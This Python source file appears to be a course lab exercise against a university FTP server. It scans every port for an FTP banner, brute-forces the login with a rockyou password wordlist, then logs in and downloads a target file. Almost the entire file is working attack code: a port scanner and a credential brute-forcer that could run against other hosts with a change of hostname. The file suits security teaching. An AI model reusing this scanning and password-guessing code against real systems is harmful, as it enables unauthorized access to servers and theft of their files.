#include python socket library
#these should be the only libararies you need 
from socket import *
from threading import *


serverName = 'netlab.encs.vancouver.wsu.edu'
serverPort = 1 # you need to find out the port number in phase 1
USERNAME = 'cs455'
USERPASS = '?' # you need to find out the password in phase 2
PASSFILE = 'rockyou_short.txt'


#  ------------------------------------------------------------# 
#  Phase 1: [Reconnaissance] Find out which port on the server #  
# -------------------------------------------------------------#

print '\nScanning ports for FTP server...\n'

while serverPort < 65535:
	clientSocket = socket(AF_INET, SOCK_STREAM)
	clientSocket.settimeout(3)
	try:
		serverPort += 1
		clientSocket.connect((serverName, serverPort))
		try:
			recievedMessage = clientSocket.recv(100)
			#print('Message recieved from port {}: {}'.format(serverPort, recievedMessage))
			if 'FTP' in recievedMessage:
				print('FTP server port found! Port number is {}\n'.format(serverPort))
				clientSocket.close()
				break
			else:				
				clientSocket.close()
				continue
		except timeout: 
			#print('No response from port {}'.format(serverPort))
			clientSocket.close()
	except error: 
		continue

	


#---------------------------------------------------------------------------------#
# Phase 2:[Attacking] Use brute force approach to find what the login password is #
#---------------------------------------------------------------------------------#


passfile = open(PASSFILE, 'r') #shortened text file to find password quicker
passlist = passfile.readlines()
passfile.close()

for x in passlist:

	clientSocket = socket(AF_INET, SOCK_STREAM)
	clientSocket.connect((serverName, serverPort))
	response = clientSocket.recv(1024)
	request = 'USER ' + USERNAME + '\r\n'
	clientSocket.send(request)
	response = clientSocket.recv(1024)
	print 'Attempting password: {}'.format(x)
	request = 'PASS ' + x + '\r\n'
	clientSocket.send(request)
	response = clientSocket.recv(1024)
	if 'success' in response:
		USERPASS = x
		print('Login successful! Password is {}'.format(x))
		break
	else:
		clientSocket.close()


# -----------------------------------------------------------------------------------------------------------#
# Phase 3: [Exploitation] Search and download a file that has words cs455 and programming to the local drive #
#------------------------------------------------------------------------------------------------------------#

# tell server to use passive mode 

clientSocket = socket(AF_INET, SOCK_STREAM)
clientSocket.connect((serverName, serverPort))
clientSocket.recv(1024)

request = 'USER ' + USERNAME + '\r\n'
clientSocket.send(request)
clientSocket.recv(1024)

request = 'PASS ' + USERPASS + '\r\n'
clientSocket.send(request)
clientSocket.recv(1024)

request = 'PASV \r\n'
clientSocket.send(request)
response = clientSocket.recv(1024)
IPfinder = response.split(' ')[-1][1:][:-4].split(',')
dataIP = IPfinder[0] + '.' + IPfinder[1] + '.' + IPfinder[2] + '.' + IPfinder[3]
dataPort = int(IPfinder[4]) * 256 + int(IPfinder[5])
FTPsocket = socket(AF_INET, SOCK_STREAM)
FTPsocket.connect((dataIP, dataPort))

request = 'LIST \r\n'
clientSocket.send(request)
response = clientSocket.recv(1024)
response = FTPsocket.recv(1024)
listing = response.split(' ')
for x in listing:
	if 'cs455' in x and 'programming' in x:
		filename = x
		print 'Target file found: {}'.format(filename)
response = clientSocket.recv(1024)
FTPsocket.close()


#filename found, reconnect to new data socket and pull the file

request = 'PASV \r\n'
clientSocket.send(request)
response = clientSocket.recv(1024)
IPfinder = response.split(' ')[-1][1:][:-4].split(',')
dataPort = int(IPfinder[4]) * 256 + int(IPfinder[5])
FTPsocket = socket(AF_INET, SOCK_STREAM)
FTPsocket.connect((dataIP, dataPort))

request = 'RETR ' + filename + '\r\n'
clientSocket.send(request)
response = clientSocket.recv(1024)
response = FTPsocket.recv(1024)
newFile = open(filename, 'w')
print 'File Retrieved! Mission Complete!'
newFile.write(response)
newFile.close()
response = clientSocket.recv(1024)
FTPsocket.close()

"""
FTPsocket = socket(AF_INET, SOCK_STREAM)
FTPsocket.connect()

request = 'LIST \r\n'
clientSocket.send(request)
response = clientSocket.recv(1024)
print response
"""
# --------------------- clean up ----------------------------------#
clientSocket.close()
